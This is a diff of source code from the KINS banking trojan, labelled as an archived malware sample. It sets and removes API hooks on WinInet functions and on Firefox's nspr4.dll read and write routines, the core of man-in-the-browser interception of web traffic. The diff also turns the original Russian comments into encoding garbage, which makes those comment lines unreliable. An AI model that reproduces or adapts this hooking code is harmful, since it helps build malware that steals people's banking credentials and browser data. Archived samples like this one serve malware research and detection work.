@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <wincrypt.h>
 #include <wininet.h>
@@ -42,14 +53,14 @@ void WinApiTables::uninit(void)
 }
 
 /*
-  Снимает перехватыват со всеx WinApi из списка
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅx WinApi пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
-  IN process            - процесс.
-  IN OUT list           - список.
-  IN count              - кол. эелементов.
+  IN process            - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN OUT list           - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN count              - пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return                - true - если снять перехват со всех WinApi,
-                          false - если не снят перехват хотя бы с одной WinAPI.
+  Return                - true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ WinApi,
+                          false - пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ WinAPI.
 */
 static bool unhookList(HANDLE process, HOOKWINAPI *list, DWORD count)
 {
@@ -78,19 +89,19 @@ static void hotPatchCallback(const void *functionForHook, const void *originalFu
 }
 
 /*
-  Перехватывает все WinApi из списка
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ WinApi пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
-  IN process            - процесс.
-  IN OUT list           - список.
-  IN count              - кол. эелементов.
-  IN realCount          - кол. эелементов, должны быть равны. Смысл это понятен в коде.
+  IN process            - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN OUT list           - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN count              - пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN realCount          - пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ.
 
-  Return                - true - если перехвачены все WinApi,
-                          false - если не перехвачена хотя бы одна WinAPI.
+  Return                - true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ WinApi,
+                          false - пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ WinAPI.
 */
 static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCount)
 {
-	//Страхуемся.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	if(count != realCount)
 	{
 #   if defined WDEBUG2
@@ -99,7 +110,7 @@ static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCo
 		return false;
 	}
 
-	//Обнуляем структуру на всякий случай.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 	for(DWORD i = 0; i < count; i++)
 	{
 		if(list[i].functionForHook == NULL)
@@ -116,7 +127,7 @@ static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCo
 	LPBYTE opcodesBuf = (LPBYTE)WaHook::_allocBuffer(process, count);
 	if(opcodesBuf != NULL)
 	{
-		//Ставим хуки.    
+		//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.    
 		DWORD i = 0;
 		for(; i < count; i++)
 		{
@@ -137,7 +148,7 @@ static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCo
 
 		if(i == count)return true;
 
-		//Снимаем хуки.
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 		unhookList(process, list, count);
 	}
 
@@ -145,7 +156,7 @@ static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCo
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
-// Таблица перехвата для пользовательского процесса.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 static HOOKWINAPI userHooks[] =
 {
@@ -180,7 +191,7 @@ bool WinApiTables::_setUserHooks(void)
 	userHooks[i++].functionForHook = CWA(wininet, InternetReadFileExA);
 	userHooks[i++].functionForHook = CWA(wininet, InternetQueryDataAvailable);
 
-	//Хукаем.
+	//пїЅпїЅпїЅпїЅпїЅпїЅ.
 	return hookList(CURRENT_PROCESS, userHooks, i, sizeof(userHooks) / sizeof(HOOKWINAPI));
 }
 
@@ -232,7 +243,7 @@ bool WinApiTables::_removeUserHooks(void)
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
-// Таблица перехвата для nspr4.dll.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ nspr4.dll.
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 
 static HOOKWINAPI nspr4Hooks[] =
@@ -290,7 +301,7 @@ bool WinApiTables::_setNspr4Hooks(HMODULE nspr4Handle)
 	nspr4Hooks[i++].functionForHook = CWA(kernel, GetProcAddress)(nspr4Handle, prwrite);
 	nspr4Hooks[i++].functionForHook = CWA(kernel, GetProcAddress)(nspr4Handle, prpoll);
 
-	//Хукаем.
+	//пїЅпїЅпїЅпїЅпїЅпїЅ.
 	bool ok = hookList(CURRENT_PROCESS, (HOOKWINAPI*)nspr4Hooks, i, i);
 	if(ok)
 	{
